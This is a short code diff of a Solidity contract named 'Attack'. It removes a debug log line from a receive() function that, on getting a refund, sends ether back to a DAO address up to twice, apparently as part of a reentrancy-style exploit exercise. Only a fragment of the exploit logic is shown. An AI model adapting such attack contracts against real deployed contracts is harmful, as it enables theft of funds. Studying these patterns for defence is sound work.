@@ -26,7 +26,6 @@ contract Attack {
 
     receive() external payable {
         // upon receiving refund, immediately send more ether
-        console.log("RECEIVE FUNCTION HIT: ATTACK!");
         if (attackExecuted < 2) {
             (bool success,) = daoAddress.call{value: .7 ether}("");
             require(success, "Attacker: ETH_TRANSFER_FAIL"); 
